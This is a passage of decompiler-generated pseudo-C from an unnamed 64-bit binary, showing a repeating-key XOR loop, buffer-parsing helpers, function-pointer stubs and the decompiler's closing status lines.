      *(_BYTE *)(*(_QWORD *)a1 + i) ^= *(_BYTE *)(*(_QWORD *)a2 + i % *(_DWORD *)(a2 + 8));
    }
  }
  return i_1;
}

//----- (0000000000401FB7) ----------------------------------------------------
__int64 __fastcall sub_401FB7(int a1, __int64 a2)
{
  if (a1)
    return *(_QWORD *)a2;
  else
    return 1;
}

//----- (0000000000402600) ----------------------------------------------------
__int64 __fastcall sub_402600(__int64 a1, unsigned int a2, unsigned int a3, unsigned int a4)
{
  __int64 v5; // [rsp+28h] [rbp-28h]
  _QWORD *v6; // [rsp+40h] [rbp-10h]
  _QWORD *v7; // [rsp+48h] [rbp-8h]

  v7 = (_QWORD *)(a1 + a3);
  v6 = (_QWORD *)(a1 + a4);
  v5 = a1 + a2;
  if (!v5)
    return 0;
  while (*v7)
  {
    *v6 = v5;
    ++v7;
    ++v6;
  }
  return 1;
}
// 4026E8: conditional instruction was optimized away because %var_28.8!=0

//----- (0000000000402E2D) ----------------------------------------------------
__int64(__fastcall *sub_402E2D())()
{
  return nullsub_1;
}
// 402E54: using guessed type __int64 __fastcall nullsub_1();

//----- (0000000000402E35) ----------------------------------------------------
char *sub_402E35()
{
  return (char *)&loc_402E69 + 3;
}

//----- (0000000000402E3D) ----------------------------------------------------
char *sub_402E3D()
{
  return (char *)&loc_402E69 + 3;
}

//----- (0000000000402E55) ----------------------------------------------------
__int64 __fastcall sub_402E55(_DWORD *a1, _QWORD *a2)
{
  *a1 = dword_402E97;
  *a2 = qword_402E9C;
  return 0;
}
// 402E97: using guessed type int dword_402E97;
// 402E9C: using guessed type __int64 qword_402E9C;

//----- (0000000000402EBF) ----------------------------------------------------
__int64 __fastcall sub_402EBF(__int64 a1, __int64 a2)
{
  return ((__int64(__fastcall *)(__int64, __int64))loc_403622)(a1, a2);
}

//----- (00000000004034EF) ----------------------------------------------------
__int64 sub_4034EF()
{
  return ((__int64(__fastcall *)(_QWORD))loc_40306D)(0);
}

//----- (000000000040350B) ----------------------------------------------------
__int64 sub_40350B()
{
  return ((__int64(__fastcall *)(_QWORD))loc_40306D)(0);
}

//----- (0000000000403524) ----------------------------------------------------
__int64 sub_403524()
{
  return 0;
}

//----- (0000000000403C57) ----------------------------------------------------
__int64 __fastcall sub_403C57(__int64 a1)
{
  unsigned int v2; // [rsp+2Ch] [rbp-4h] BYREF

  v2 = 0;
  ((void(__fastcall *)(__int64, unsigned int *, __int64))loc_403BDF)(a1, &v2, 4);
  return v2;
}

//----- (0000000000403CEB) ----------------------------------------------------
__int64 __fastcall sub_403CEB(__int64 a1, int a2)
{
  __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = *(_QWORD *)(a1 + 8);
  if (a2 <= 0)
    return 0;
  *(_QWORD *)(a1 + 8) += a2;
  *(_DWORD *)(a1 + 16) -= a2;
  return v3;
}

//----- (0000000000403D46) ----------------------------------------------------
__int64 __fastcall sub_403D46(__int64 a1, int *a2)
{
  __int64 v3; // [rsp+20h] [rbp-10h]
  int v4;     // [rsp+2Ch] [rbp-4h]

  v4 = sub_403C57(a1);
  v3 = sub_403CEB(a1, v4);
  if (a2)
    *a2 = v4;
  return v3;
}

//----- (0000000000403D8E) ----------------------------------------------------
__int64 __fastcall sub_403D8E(__int64 a1, _DWORD *a2)
{
  int i_1; // [rsp+28h] [rbp-58h]
  int i;   // [rsp+2Ch] [rbp-54h]

  i_1 = sub_403C57(a1);
  if (i_1 && 8LL * i_1)
  {
    if (a2)
      *a2 = i_1;
    for (i = 0; i < i_1; ++i)
      *(_QWORD *)(8LL * i + 8LL * i_1) = sub_403D46(a1, 0);
    return 8LL * i_1;
  }
  else
  {
    if (a2)
      *a2 = 0;
    return 0;
  }
}

// nfuncs=59 queued=50 decompiled=50 lumina nreq=0 worse=0 better=0
// ALL OK, 50 function(s) have been successfully decompiled
